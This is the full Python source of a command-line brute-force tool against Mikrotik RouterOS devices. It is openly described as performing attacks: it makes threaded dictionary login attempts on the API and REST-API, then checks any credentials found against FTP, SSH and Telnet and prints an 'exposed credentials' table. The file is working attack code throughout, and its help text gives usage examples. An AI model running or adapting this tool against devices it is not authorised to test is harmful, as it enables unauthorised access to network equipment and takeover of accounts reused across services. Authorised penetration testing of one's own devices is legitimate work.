#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Andre Henrique (LinkedIn: https://www.linkedin.com/in/mrhenrike)

_version = "1.15"

# This module provides a brute-force attack tool for Mikrotik RouterOS API and REST-API
# It allows users to test credentials against the API and validate post-login access to services like FTP, SSH, and TELNET.
# It includes a simple logging system with color-coded output for terminal
# It respects verbosity flags: normal, verbose, and very verbose (debug)
#
import time, argparse, threading, concurrent.futures, socket, urllib3, warnings, requests
from datetime import datetime
from pathlib import Path
from requests.auth import HTTPBasicAuth

# Suppress warnings from urllib3 and requests
warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Check if the required modules are available
try:
    from _api import Api
except ModuleNotFoundError:
    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_api' not found.")

try:
    from _log import Log
except ModuleNotFoundError:
    raise ImportError(f"[{datetime.now().strftime('%H:%M:%S')}] Module '_log' not found.")

# Check if the required modules are available
def current_time():
    return datetime.now().strftime("%H:%M:%S")

# Function to check if a port is open on the target host
def is_port_open(host, port, timeout=2):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except:
        return False

# Function to test REST API login
def test_restapi_login(host, username, password, port, use_ssl=False):
    protocol = "https" if use_ssl else "http"
    url = f"{protocol}://{host}:{port}/rest/system/identity"
    try:
        response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5, verify=False)
        return response.status_code == 200
    except Exception:
        return False

# Function to check service ports
def check_service_ports(target, api_port, http_port, ssl_port, validate_services, use_ssl, log):
    services_ok = {
        "api": is_port_open(target, api_port),
        "http": is_port_open(target, http_port)
    }

    if use_ssl:
        services_ok["ssl"] = is_port_open(target, ssl_port)
        services_ok["restapi"] = is_port_open(target, ssl_port if use_ssl else http_port)

    for svc in ["ftp", "ssh", "telnet"]:
        if svc in validate_services:
            port = validate_services.get(svc) or {"ftp": 21, "ssh": 22, "telnet": 23}[svc]
            services_ok[svc] = is_port_open(target, port)

    if not services_ok["http"]:
        log.error(f"[CHECK] HTTP port ({http_port}) is closed. Aborting.")
        exit(1)

    if not services_ok["api"]:
        log.error(f"[CHECK] API port ({api_port}) is closed. Aborting.")
        exit(1)

    if use_ssl and not services_ok.get("ssl"):
        log.warning(f"[CHECK] SSL port ({ssl_port}) is closed. Ignoring tests with SSL.")

    for svc in ["ftp", "ssh", "telnet"]:
        if svc in validate_services and not services_ok.get(svc, True):
            log.warning(f"[CHECK] Service port {svc.upper()} is closed. Ignoring validation.")

    return services_ok

# === Class for Brute Force Attack ===
class Bruteforce:
    def __init__(self, target, usernames, passwords, combo_dict, delay, api_port=8728, rest_port=8729, http_port=80, use_ssl=False, ssl_port=443, max_workers=2, verbose=False, verbose_all=False, validate_services=None, services_ok=None):
        self.target = target
        self.api_port = api_port
        self.rest_port = rest_port
        self.http_port = http_port
        self.ssl_port = ssl_port
        self.usernames = usernames
        self.passwords = passwords
        self.combo_dict = combo_dict
        self.delay = delay
        self.use_ssl = use_ssl
        self.max_workers = min(max_workers, 15)
        self.verbose = verbose
        self.verbose_all = verbose_all
        self.validate_services = validate_services or {}
        self.services_ok = services_ok or {}
        self.log = Log(verbose=verbose, verbose_all=verbose_all)
        self.wordlist = []
        self.successes = []
        self.lock = threading.Lock()
        self.index_lock = threading.Lock()
        self.index = 0
        self.load_wordlist()

    # Load wordlist from file or generate based on provided usernames and passwords
    def load_file(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

    # Load wordlist based on the provided parameters
    def load_wordlist(self):
        try:
            if self.combo_dict:
                self.wordlist = [tuple(line.split(':')) for line in self.load_file(self.combo_dict) if ':' in line]
            elif self.usernames and self.passwords:
                ufile = Path(self.usernames).is_file()
                pfile = Path(self.passwords).is_file()
                if not ufile and not pfile:
                    self.wordlist = [(self.usernames, self.passwords)]
                elif ufile and not pfile:
                    users = self.load_file(self.usernames)
                    self.wordlist = [(u, self.passwords) for u in users]
                elif not ufile and pfile:
                    pwds = self.load_file(self.passwords)
                    self.wordlist = [(self.usernames, p) for p in pwds]
                else:
                    users = self.load_file(self.usernames)
                    pwds = self.load_file(self.passwords)
                    self.wordlist = [(u, p) for u in users for p in pwds]
            elif self.usernames:
                self.wordlist = [(u, '') for u in self.load_file(self.usernames)] if Path(self.usernames).is_file() else [(self.usernames, '')]
            elif self.passwords:
                self.wordlist = [("admin", p) for p in self.load_file(self.passwords)] if Path(self.passwords).is_file() else [("admin", self.passwords)]
            else:
                self.wordlist = [("admin", "")]
        except Exception as e:
            self.log.error(f"Error loading wordlist: {e}")
            exit(1)
        self.wordlist = list(dict.fromkeys(self.wordlist))

    # Get the next combination of username and password
    def get_next_combo(self):
        with self.index_lock:
            if self.index >= len(self.wordlist):
                return None
            combo = self.wordlist[self.index]
            self.index += 1
            return combo

    # Worker function for each thread
    def worker(self):
        while True:
            combo = self.get_next_combo()
            if combo is None:
                break
            user, password = combo

            if self.verbose_all:
                self.log.debug(f"Trying -> {user}:{password}")

            services = []

            # === Test API ===
            if self.services_ok.get("api"):
                try:
                    api = Api(self.target, self.api_port, use_ssl=False)
                    result = api.login(user, password)
                    if result:
                        services.append("api")
                        self.log.success(f"[API] {user}:{password}")
                    elif self.verbose or self.verbose_all:
                        self.log.fail(f"[API] {user}:{password}")
                except Exception as e:
                    if self.verbose_all:
                        self.log.warning(f"[API] error for {user}:{password} — {e}")
            else:
                if self.verbose_all:
                    self.log.debug("[SKIP] API test skipped due to port check.")

            # === Test REST ===
            if self.services_ok.get("http") or (self.use_ssl and self.services_ok.get("ssl")):
                try:
                    rest_port = self.ssl_port if self.use_ssl else self.http_port
                    rest_result = test_restapi_login(
                        host=self.target,
                        username=user,
                        password=password,
                        port=rest_port,
                        use_ssl=self.use_ssl
                    )
                    if rest_result:
                        services.append("restapi")
                        self.log.success(f"[REST] {user}:{password}")
                    elif self.verbose or self.verbose_all:
                        self.log.fail(f"[REST] {user}:{password}")
                except requests.exceptions.HTTPError as http_err:
                    if http_err.response.status_code == 401 and "api" in services:
                        self.log.warning(f"[REST] Unauthorized for {user}:{password} — Hint: check if 'api' policy is enabled")
                    elif self.verbose_all:
                        self.log.warning(f"[REST] HTTP error for {user}:{password} — {http_err}")
                except Exception as e:
                    if self.verbose_all:
                        self.log.warning(f"[REST] error for {user}:{password} — {e}")
            else:
                if self.verbose_all:
                    self.log.debug("[SKIP] REST-API test skipped due to port check.")

            # === Add valid credential ===
            if services:
                with self.lock:
                    self.successes.append({"user": user, "pass": password, "services": services})

            time.sleep(self.delay)

    # === Print progress ===
    def validate_extra_services(self):
        from ftplib import FTP
        import telnetlib
        import paramiko

        for cred in self.successes:
            user = cred["user"]
            passwd = cred["pass"]
            validated = []

            # === FTP ===
            if "ftp" in self.validate_services and self.services_ok.get("ftp", False):
                port = self.validate_services.get("ftp") or 21
                try:
                    if self.verbose_all:
                        self.log.debug(f"Testing FTP for {user}:{passwd} on port {port}")
                    ftp = FTP()
                    ftp.connect(self.target, port, timeout=5)
                    ftp.login(user, passwd)
                    validated.append("ftp")
                    ftp.quit()
                except Exception as e:
                    if self.verbose_all:
                        self.log.debug(f"FTP failed for {user}:{passwd} — {e}")
            elif "ftp" in self.validate_services and self.verbose_all:
                self.log.debug(f"[SKIP] FTP test skipped due to port check.")

            # === SSH ===
            if "ssh" in self.validate_services and self.services_ok.get("ssh", False):
                port = self.validate_services.get("ssh") or 22
                try:
                    if self.verbose_all:
                        self.log.debug(f"Testing SSH for {user}:{passwd} on port {port}")
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(self.target, port=port, username=user, password=passwd, timeout=5)
                    validated.append("ssh")
                    client.close()
                except Exception as e:
                    if self.verbose_all:
                        self.log.debug(f"SSH failed for {user}:{passwd} — {e}")
            elif "ssh" in self.validate_services and self.verbose_all:
                self.log.debug(f"[SKIP] SSH test skipped due to port check.")

            # === TELNET ===
            if "telnet" in self.validate_services and self.services_ok.get("telnet", False):
                port = self.validate_services.get("telnet") or 23
                try:
                    if self.verbose_all:
                        self.log.debug(f"Testing TELNET for {user}:{passwd} on port {port}")
                    tn = telnetlib.Telnet(self.target, port, timeout=5)
                    tn.read_until(b"login: ", timeout=5)
                    tn.write(user.encode('ascii') + b"\n")
                    tn.read_until(b"Password: ", timeout=5)
                    tn.write(passwd.encode('ascii') + b"\n")

                    idx, match, _ = tn.expect([
                        b"incorrect", b">", b"#", b"\$"
                    ], timeout=5)
                    tn.close()

                    if idx in [1, 2, 3]:  # prompt shell
                        validated.append("telnet")
                        if self.verbose_all:
                            self.log.debug(f"TELNET login success for {user}:{passwd}")
                    elif idx == 0:
                        matched_text = match.group().decode(errors="ignore")
                        self.log.debug(f"TELNET failed for {user}:{passwd} — matched: {matched_text.strip()}")
                    else:
                        validated.append("telnet")
                        self.log.debug(f"TELNET login assumed valid for {user}:{passwd} — no known prompt matched")
                except Exception as e:
                    if self.verbose_all:
                        self.log.debug(f"TELNET exception for {user}:{passwd} on port {port} — {e}")
            elif "telnet" in self.validate_services and self.verbose_all:
                self.log.debug(f"[SKIP] TELNET test skipped due to port check.")

            # === Add services validations ===
            if validated:
                cred["services"].extend(s for s in validated if s not in cred["services"])

    # === Main function to run the brute force attack ===
    def run(self):
        self.log.info("[*] Starting brute force attack...")
        self.log.info(f"[*] Total Attempts {len(self.wordlist)}...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.worker) for _ in range(self.max_workers)]
            concurrent.futures.wait(futures)

        self.log.info("[*] Attack finished.\n")

        # === Post-login validation ===
        if self.validate_services and self.successes:
            services_list = ', '.join(s.upper() for s in self.validate_services.keys())
            self.log.info(f"[*] Initiating post-login validation for: {services_list}")
            self.validate_extra_services()

        # === Print results ===
        if self.successes:
            print("\n## CREDENTIAL(S) EXPOSED ##")
            deduped = list({(d["user"], d["pass"]): d for d in self.successes}.values())
            max_user = max(len(d["user"]) for d in deduped)
            max_pass = max(len(d["pass"]) for d in deduped)

            print(f"{'-'*80}")
            print(f"ORD | {'USERNAME':<22} | {'PASSWORD':<22} | SERVICES")
            print(f"{'-'*80}")
            for idx, d in enumerate(deduped, start=1):
                services = ', '.join(d["services"])
                print(f"{idx:03} | {d['user']:<22} | {d['pass']:<22} | {services}")
            print(f"{'-'*80}")
            print("\nAttack completed successfully.\n")
        else:
            print("\nNo credentials were validated successfully with the given users and passwords.\n")

# === CLI Entrypoint ===
# This is the main entry point for the script. It sets up the command-line interface (CLI) using argparse.
# It defines the arguments that can be passed to the script, including target IP, username/password lists, timing options, and validation services.
# It also handles the parsing of these arguments and initializes the brute-force attack process.
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        description="""
    Mikrotik RouterOS API Brute Force Tool
    --------------------------------------
    Perform brute-force attacks against Mikrotik RouterOS API and REST-API services.
    Optionally validate post-auth access to services like FTP, SSH, and TELNET.

    Quick examples:
        python mikrotikapi-bf.py -t 192.168.0.1 -U admin -P 123456
        python mikrotikapi-bf.py -t 192.168.0.1 -u users.txt -p passwords.txt
        python mikrotikapi-bf.py -t 192.168.0.1 -d combos.txt
        python mikrotikapi-bf.py -t 192.168.0.1 -d combos.txt --validate ftp,ssh=2222,telnet
        python mikrotikapi-bf.py -t 192.168.0.1 -d combos.txt --ssl --ssl-port 443

    Verbosity modes:
        -v   Basic output with progress and results
        -vv  Full debug mode with detailed logs and warnings
    """,
        formatter_class=argparse.RawTextHelpFormatter
    )

    # === Target ===
    parser.add_argument("-t", "--target", required=True, help="Target IP address or hostname of Mikrotik device")

    # === Credentials ===
    parser.add_argument("-U", "--user", default="admin", help="Single username (default: admin)")
    parser.add_argument("-P", "--passw", help="Single password")
    parser.add_argument("-u", "--userlist", help="File with list of usernames")
    parser.add_argument("-p", "--passlist", help="File with list of passwords")
    parser.add_argument("-d", "--dictionary", help="File with combo list (user:pass format)")

    # === Timing and Performance ===
    parser.add_argument("-s", "--seconds", type=int, default=5, help="Delay between attempts in seconds (default: 5)")
    parser.add_argument("--threads", type=int, default=2, help="Number of concurrent threads (default: 2, max: 15)")

    # === Ports and Protocols ===
    parser.add_argument("--api-port", type=int, default=8728, help="Mikrotik API port (default: 8728)")
    parser.add_argument("--rest-port", type=int, default=8729, help="Mikrotik REST API port (default: 8729)")
    parser.add_argument("--http-port", type=int, default=80, help="HTTP port for REST-API without SSL (default: 80)")
    parser.add_argument("--ssl", action="store_true", help="Enable HTTPS requests for REST-API")
    parser.add_argument("--ssl-port", type=int, default=443, help="HTTPS port for REST-API (default: 443)")

    # === Post-login Service Validation ===
    parser.add_argument("--validate", help=(
        "Comma-separated list of services to validate after login. "
        "Supports optional custom ports: ftp, ssh, telnet (e.g., ftp=2121,ssh=2222)"
    ))

    # === Output and Debug ===
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output with failed attempts")
    parser.add_argument("-vv", "--verbose-all", action="store_true", help="Enable full debug output")


    args = parser.parse_args()

    Log.banner(version=_version)

    def parse_validate_services(raw_input):
        services = {}
        if not raw_input:
            return services
        for item in raw_input.split(','):
            item = item.strip()
            if '=' in item:
                name, port = item.split('=', 1)
                if port.isdigit():
                    services[name.lower()] = int(port)
            else:
                services[item.lower()] = None
        return services

    service_ports = parse_validate_services(args.validate)
    usernames = args.userlist if args.userlist else args.user
    passwords = args.passlist if args.passlist else args.passw

    # Check if the target is provided
    log = Log(verbose=args.verbose, verbose_all=args.verbose_all)

    # Check if ports are open
    services_ok = check_service_ports(
        target=args.target,
        api_port=args.api_port,
        http_port=args.http_port,
        ssl_port=args.ssl_port,
        validate_services=service_ports,
        use_ssl=args.ssl,
        log=log
    )

    # Instancia brute
    bf = Bruteforce(
        target=args.target,
        api_port=args.api_port,
        rest_port=args.rest_port,
        http_port=args.http_port,
        usernames=usernames,
        passwords=passwords,
        combo_dict=args.dictionary,
        delay=args.seconds,
        use_ssl=args.ssl,
        ssl_port=args.ssl_port,
        max_workers=args.threads,
        verbose=args.verbose,
        verbose_all=args.verbose_all,
        validate_services=service_ports
    )

    # Set the services_ok attribute
    bf.services_ok = services_ok

    try:
        bf.run()
    except KeyboardInterrupt:
        print(f"\n[{current_time()}] [!] Attack interrupted by user. Exiting cleanly.\n")

    def format_status(status):
        return {
            True: "OK",
            False: "ERROR",
            None: "NOT TESTED"
        }.get(status, "UNKNOWN")

    def format_port_checked(port, default, status):
        if status is True:
            return str(port if port is not None else default)
        elif status is False:
            return str(port)
        return "N/A"

    # === SERVICE SUMMARY ===
    print("## SERVICE SUMMARY ##")
    print(f"{'-'*40}")
    print(f"ORD | {'SERVICE':<8} | PORT  | STATUS")
    print(f"{'-'*40}")
    print(f" 1  | {'API':<8} | {format_port_checked(args.api_port, 8728, services_ok.get('api')):<5} | {format_status(services_ok.get('api'))}")
    print(f" 2  | {'HTTP':<8} | {format_port_checked(args.http_port, 80, services_ok.get('http')):<5} | {format_status(services_ok.get('http'))}")
    print(f" 3  | {'SSL':<8} | {format_port_checked(args.ssl_port, 443, services_ok.get('ssl')):<5} | {format_status(services_ok.get('ssl'))}")
    print(f" 4  | {'REST':<8} | {format_port_checked(args.rest_port, 8729, services_ok.get('restapi')):<5} | {format_status(services_ok.get('restapi'))}")
    print(f" 5  | {'HTTPS':<8} | {format_port_checked(args.ssl_port, 443, services_ok.get('restapi')):<5} | {format_status(services_ok.get('restapi'))}")
    print(f" 6  | {'FTP':<8} | {format_port_checked(service_ports.get('ftp'), 21, services_ok.get('ftp')):<5} | {format_status(services_ok.get('ftp'))}")
    print(f" 7  | {'TELNET':<8} | {format_port_checked(service_ports.get('telnet'), 23, services_ok.get('telnet')):<5} | {format_status(services_ok.get('telnet'))}")
    print(f" 8  | {'SSH':<8} | {format_port_checked(service_ports.get('ssh'), 22, services_ok.get('ssh')):<5} | {format_status(services_ok.get('ssh'))}")
    print(f"{'-'*40}")
    print("\n")
